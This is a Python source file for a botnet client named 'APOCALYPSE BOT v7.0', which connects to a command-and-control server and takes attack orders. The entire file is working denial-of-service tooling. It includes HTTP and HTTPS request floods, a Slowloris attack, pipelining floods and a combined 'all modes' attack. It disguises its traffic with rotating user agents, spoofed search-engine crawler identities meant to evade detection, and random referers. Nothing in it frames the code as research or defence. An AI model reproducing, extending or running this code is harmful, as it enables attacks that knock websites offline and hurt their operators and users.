#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# APOCALYPSE BOT v7.0
# BY: 𝙳𝚎𝚊𝚝Nex

import socket
import threading
import json
import time
import random
import requests
import ssl
import os
import hashlib
from datetime import datetime
from urllib.parse import urlparse

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
DIM = '\033[2m'
RESET = '\033[0m'

# Simple Banner
BANNER = f"""
{CYAN}┌─────────────────────────────────────────┐
│  🤖 APOCALYPSE BOT v7.0                       
│  BY:𝙳𝚎𝚊𝚝Nex                                    
│  L7 MASTER                      
└─────────────────────────────────────────┘{RESET}
"""

# ========== 100+ USER AGENTS ==========
USER_AGENTS = [
    # Windows Chrome (15)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
    # Windows Firefox (8)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
    # Windows Edge (6)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36',
    # Mac Chrome (8)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    # Mac Safari (5)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0',
    # Mac Firefox (5)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    # Linux Chrome (8)
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    # Linux Firefox (5)
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    # Android Chrome (10)
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    # iPhone Safari (8)
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    # iPhone Chrome (4)
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    # iPad (4)
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    # Bot Crawlers (8) - anti detection
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Twitterbot/1.0',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta; +http://www.linkedin.com)',
]

# ========== 80+ REFERERS ==========
REFERERS = [
    # Search Engines (12)
    'https://google.com', 'https://google.co.id', 'https://google.co.uk',
    'https://bing.com', 'https://yahoo.com', 'https://duckduckgo.com',
    'https://yandex.com', 'https://baidu.com', 'https://ecosia.org',
    'https://qwant.com', 'https://seznam.cz', 'https://naver.com',
    # Social Media (15)
    'https://facebook.com', 'https://m.facebook.com', 'https://instagram.com',
    'https://twitter.com', 'https://tiktok.com', 'https://linkedin.com',
    'https://pinterest.com', 'https://reddit.com', 'https://tumblr.com',
    'https://snapchat.com', 'https://whatsapp.com', 'https://telegram.org',
    'https://discord.com', 'https://twitch.tv', 'https://onlyfans.com',
    # Video & Music (8)
    'https://youtube.com', 'https://youtu.be', 'https://vimeo.com',
    'https://dailymotion.com', 'https://spotify.com', 'https://soundcloud.com',
    'https://apple.com/music', 'https://deezer.com',
    # E-commerce (10)
    'https://amazon.com', 'https://ebay.com', 'https://aliexpress.com',
    'https://tokopedia.com', 'https://shopee.co.id', 'https://lazada.co.id',
    'https://blibli.com', 'https://bukalapak.com', 'https://zalora.co.id',
    'https://jd.id',
    # News & Portal (8)
    'https://cnn.com', 'https://bbc.com', 'https://nytimes.com',
    'https://kompas.com', 'https://detik.com', 'https://liputan6.com',
    'https://tempo.co', 'https://republika.co.id',
    # Tech & Developer (10)
    'https://github.com', 'https://gitlab.com', 'https://stackoverflow.com',
    'https://medium.com', 'https://dev.to', 'https://hackerrank.com',
    'https://leetcode.com', 'https://w3schools.com', 'https://codecademy.com',
    'https://freecodecamp.org',
    # Edu & Government (7)
    'https://wikipedia.org', 'https://kemdikbud.go.id', 'https://gov.id',
    'https://ui.ac.id', 'https://its.ac.id', 'https://ugm.ac.id',
    'https://unair.ac.id',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9',
    'id,en;q=0.9', 'ms-MY,ms;q=0.9,en;q=0.8', 'en-AU,en;q=0.9',
    'zh-CN,zh;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8',
]

def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
    }

def random_delay():
    return random.uniform(0.01, 0.05)

def random_query(url):
    param = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
    return f"{url}?_r={param}" if '?' not in url else f"{url}&_r={param}"

class ApocalypseBot:
    def __init__(self, server_host, server_port=4444):
        self.server = (server_host, server_port)
        self.running = True
        self.attack_running = False
    
    def log(self, msg, level='info'):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == 'success':
            print(f"{DIM}[{timestamp}]{RESET} {GREEN}✓ {msg}{RESET}")
        elif level == 'error':
            print(f"{DIM}[{timestamp}]{RESET} {RED}✗ {msg}{RESET}")
        else:
            print(f"{DIM}[{timestamp}]{RESET} {CYAN}• {msg}{RESET}")
    
    def connect(self):
        print(BANNER)
        print()
        self.log(f"Connecting to {self.server[0]}:{self.server[1]}")
        
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(self.server)
                self.log("Connected", 'success')
                self.send_heartbeat()
                self.listen()
            except Exception as e:
                self.log(f"Failed: {e}, retrying...", 'error')
                time.sleep(10)
    
    def send_heartbeat(self):
        try:
            heartbeat = json.dumps({'type': 'heartbeat', 'timestamp': time.time()})
            self.sock.send(heartbeat.encode())
        except:
            pass
        threading.Timer(30, self.send_heartbeat).start()
    
    def listen(self):
        while self.running:
            try:
                data = self.sock.recv(4096).decode()
                if not data:
                    break
                cmd = json.loads(data)
                self.process_command(cmd)
            except:
                break
    
    def process_command(self, cmd):
        if cmd.get('type') == 'attack':
            mode = cmd.get('mode')
            target = cmd.get('target')
            duration = cmd.get('duration', 60)
            self.log(f"ATTACK: {mode} -> {target} ({duration}s)", 'warning')
            self.start_attack(mode, target, duration)
    
    def start_attack(self, mode, target, duration):
        self.attack_running = True
        
        if mode == 'http_l7':
            thread = threading.Thread(target=self.http_flood, args=(target, duration))
        elif mode == 'https_l7':
            thread = threading.Thread(target=self.https_flood, args=(target, duration))
        elif mode == 'slowloris_l7':
            thread = threading.Thread(target=self.slowloris, args=(target, duration))
        elif mode == 'pipeline_l7':
            thread = threading.Thread(target=self.pipeline_flood, args=(target, duration))
        elif mode == 'all_l7':
            self.log("ALL MODES ACTIVE!", 'warning')
            thread = threading.Thread(target=self.all_modes, args=(target, duration))
        else:
            return
        
        thread.daemon = True
        thread.start()
    
    def http_flood(self, target, duration):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        session = requests.Session()
        session.verify = False
        
        total, success = 0, 0
        start = time.time()
        self.log(f"HTTP L7 Flood on {target}", 'warning')
        
        while self.attack_running and (time.time() - start) < duration:
            try:
                url = random_query(target)
                r = session.get(url, headers=get_headers(), timeout=3)
                success += 1
                time.sleep(random_delay())
            except:
                pass
            total += 1
        
        self.log(f"HTTP Flood done: {success}/{total}", 'success')
    
    def https_flood(self, target, duration):
        if not target.startswith('https://'):
            target = 'https://' + target.replace('http://', '')
        
        session = requests.Session()
        session.verify = False
        
        total, success = 0, 0
        start = time.time()
        self.log(f"HTTPS L7 Flood on {target}", 'warning')
        
        while self.attack_running and (time.time() - start) < duration:
            try:
                url = random_query(target)
                r = session.get(url, headers=get_headers(), timeout=5)
                success += 1
                time.sleep(random_delay())
            except:
                pass
            total += 1
        
        self.log(f"HTTPS Flood done: {success}/{total}", 'success')
    
    def slowloris(self, target, duration):
        parsed = urlparse(target)
        host = parsed.netloc or target
        port = 443 if 'https' in target else 80
        
        sockets = []
        start = time.time()
        self.log(f"Slowloris on {host}:{port}", 'warning')
        
        for i in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                if port == 443:
                    ctx = ssl.create_default_context()
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.send(f"GET /?{i} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        while self.attack_running and (time.time() - start) < duration:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Rnd: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(sock)
            time.sleep(10)
        
        for sock in sockets:
            sock.close()
        self.log(f"Slowloris done: {len(sockets)} sockets", 'success')
    
    def pipeline_flood(self, target, duration):
        if not target.startswith('http'):
            target = 'http://' + target
        
        total, success = 0, 0
        start = time.time()
        self.log(f"HTTP Pipelining on {target}", 'warning')
        
        while self.attack_running and (time.time() - start) < duration:
            try:
                parsed = urlparse(target)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((parsed.netloc, 80))
                reqs = []
                for i in range(5):
                    reqs.append(f"GET /?p{i} HTTP/1.1\r\nHost: {parsed.netloc}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n")
                sock.send(''.join(reqs).encode())
                sock.close()
                success += 1
                time.sleep(random_delay())
            except:
                pass
            total += 1
        
        self.log(f"Pipelining done: {success}/{total}", 'success')
    
    def all_modes(self, target, duration):
        self.log("🚀 ALL MODES SIMULTANEOUSLY", 'warning')
        
        threads = [
            threading.Thread(target=self.http_flood, args=(target, duration)),
            threading.Thread(target=self.https_flood, args=(target, duration)),
            threading.Thread(target=self.slowloris, args=(target, duration)),
            threading.Thread(target=self.pipeline_flood, args=(target, duration)),
        ]
        
        for t in threads:
            t.daemon = True
            t.start()
        
        for t in threads:
            t.join()
        
        self.log("ALL MODES completed", 'success')
    
    def run(self):
        self.connect()

if __name__ == "__main__":
    print(f"{CYAN}[?] C2 IP (default: 127.0.0.1): {RESET}", end='')
    c2_ip = input().strip() or "127.0.0.1"
    
    bot = ApocalypseBot(c2_ip, 4444)
    bot.run()
